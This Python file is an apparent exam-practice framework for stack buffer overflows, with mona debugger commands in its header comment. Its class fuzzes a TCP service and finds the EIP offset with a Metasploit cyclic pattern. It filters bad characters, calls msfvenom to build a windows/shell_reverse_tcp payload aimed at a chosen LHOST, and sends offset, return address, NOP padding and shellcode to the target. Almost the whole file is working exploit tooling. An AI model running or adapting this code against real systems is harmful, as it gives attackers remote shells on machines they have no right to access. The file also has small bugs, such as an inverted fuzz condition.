#!/bin/python3

#####################
#       MONA        #
#####################
'''
## Create working folder ##
!mona config -set workingfolder c:\mona\%p

## Create bad chars ##
!mona bytearray -b "\x00"

## Detect bad chars ##
!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP>

## Find jump point ##
!mona jmp -r esp -cpb "\x00"
'''
#####################
#      IMPORTS      #
#####################
import sys
import socket
import subprocess
import textwrap
import time

#####################
#    CONNECTIONS    #
#####################
HOST = 'localhost'   # Target
PORT = 1337             # Target Port
timeout = 5

class Exploit:
    #####################
    #       MISC        #
    #####################
    offset      = 0             # The EIP offset
    retn        = b''           # The return address
    banner      = b''           # The service banner
    padding     = b''           # Encoding padding
    pattern     = b''           # Generated pattern
    badchars    = b'\x00'       # Bad characters
    payload     = b''           # The shellcode payload
    #####################
    #                   #
    #####################

    """
    =====================
        OBJ FUNCTIONS
    =====================
    """
    def __init__(self, host=HOST, port=PORT, timeout=timeout):
        self.HOST = host
        self.PORT = port
        self.timeout = timeout

    def __str__(self):
        return textwrap.dedent(f'''
            Exploit information:
                Host: {self.host}
                Port: {self.port}
                Timeout: {self.timeout}
        ''')

    """
    =====================
        GET FUNCTIONS
    =====================
    """
    def getBanner(self, decode=False):
        try: # Detect crash
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.HOST, self.PORT)) # Establish connection
                s.settimeout(timeout)   # Set timeout
                banner = s.recv(1024)   # Get the banner
                
                self.banner = banner
                if (decode):
                    return banner.decode(decode)
                return banner

        except Exception as e: # Handle crash
            print('[!] Failed to grab banner!')
            print(e)

    def getPattern(self, length, extend=400, decode=False):
        try:
            __pattern = subprocess.check_output(['/usr/share/metasploit-framework/tools/exploit/pattern_create.rb','-l', str(length+extend)])
        except Exception as e:
            print('[!] Could not create pattern!')
            print(e)

        self.pattern = __pattern

        if (decode):
            return __pattern.decode(decode)
        return __pattern

    def getOffset(self, pattern, reverse=True):
        if (type(pattern) != bytes):
            print(f'\Error: getOffset -> Pattern not bytes `{pattern}`')
            return

        self.offset = self.pattern.find(pattern[::-1] if reverse else pattern)
        return self.offset

    def getPadding(self, length, data=b'\x90'):
        self.padding = data * length
        return self.padding

    def getPayload(self, LHOST, LPORT, form='raw'):
        try:
            output = subprocess.check_output(['msfvenom', '-p', 'windows/shell_reverse_tcp', f'LHOST={LHOST}', f'LPORT={LPORT}', 'EXITFUNC=thread', '-b', self.escapedBadChars(), '-f', form])
            self.payload = output
            return self.payload
        except Exception as e:
            print('[!] Could not generate payload!')
            print(e)


        
    """
    =====================
        SET FUNCTIONS
    =====================
    """
    def setOffset(self, offset):
        self.offset = int(offset)

    def setReturn(self, retn, reverse=True):
        if (type(retn) != bytes):
            print(f'\Error: setReturn -> Return not bytes `{retn}`')
            return

        self.retn = retn[::-1] if reverse else retn
        return self.retn

    """
    =====================
        BAD CHARACTERS
    =====================
    """
    def getAllChars(self, ignoreBadChars=True, excluding=[]):
        __allchars = b''

        for k in range(len(excluding)):
            char = excluding[k]
            if (type(char) != bytes):
                print(f'\t[!] Error: getAllChars -> Char not bytes `{char}`')
                return

        badchararray = bytearray(self.badchars)
        for x in range(1, 256):
            __new = bytearray([x])
            if ((ignoreBadChars and (__new in badchararray)) or (__new in excluding)):
                continue
            
            __allchars += __new
        
        return __allchars

    def charsToPayload(self):
        self.payload = self.getAllChars()
        return self.payload

    def addBadChars(self, char):
        if (type(char) != bytes):
            print(f'\t[!] Error: addBadChars -> Char not bytes `{char}`')
            return

        self.badchars += char
        return self.badchars
    
    def removeBadChars(self, char):
        if (type(char) != bytes):
            print(f'\t[!] Error: removeBadChars -> Char not bytes `{char}`')
            return

        self.badchars = self.badchars.replace(char, b'')
        return self.badchars

    def resetBadChars(self):
        __badchars = b'\x00'

        self.badchars = __badchars
        return self.badchars

    def escapedBadChars(self):
        __escaped = ''
        for x in self.badchars:
            __escaped += '\\x%.2x' % x

        return __escaped

    """
    =====================
        SENDING DATA
    =====================
    """
    def fullSend(self, prefix, fuzz=b'', char=b'A', decode=False):
        if (type(prefix) != bytes):
            print(f'\t[!] Error: fullSend -> Prefix not bytes `{prefix}`')
            return

        if (type(fuzz) != bytes):
            print(f'\t[!] Error: fullSend -> Fuzz not bytes `{fuzz}`')
            return

        try: # Detect crash
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.HOST, self.PORT)) # Establish connection
                s.settimeout(timeout)   # Set timeout
                s.recv(1024)            # Get the banner
                
                if (fuzz != b''):
                    data = prefix + char*self.offset + self.retn + self.padding + self.payload
                else:
                    data = prefix + fuzz + self.retn + self.padding + self.payload

                self.data = data
                print('[+] Sending %s bytes...' % len(data))
                s.sendall(data)
                response = s.recv(1024)
                print('[+] Done...')
                
                if (decode):
                    return response.decode(decode)
                return response

        except Exception as e: # Handle crash
            print('[!] Error: Sent data may have caused crash.')
            print(e)

    def sendPattern(self, prefix, length, decode=False):
        if (type(prefix) != bytes):
            print(f'\t[!] Error: sendPattern -> Prefix not bytes {prefix}')
            return

        __pattern = self.getPattern(length)
        print('Pattern:', __pattern.decode('utf-8') if decode else __pattern) # Output sent pattern
        return self.send(prefix + __pattern, decode)
        
    def send(self, data, decode=False):
        if (type(data) != bytes):
            print(f'\t[!] Error: send -> Data not bytes `{data}`')
            return

        self.data = data
        try: # Detect crash
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.HOST, self.PORT)) # Establish connection
                s.settimeout(timeout)   # Set timeout
                s.recv(1024)            # Get the banner
                
                print('[+] Sending %s bytes...' % len(data))
                s.sendall(data)
                response = s.recv(1024)
                print('[+] Done...')
                
                if (decode):
                    return response.decode(decode)
                return response

        except Exception as e: # Handle crash
            print('[!] Error: Sent data may have caused crash.')
            print(e)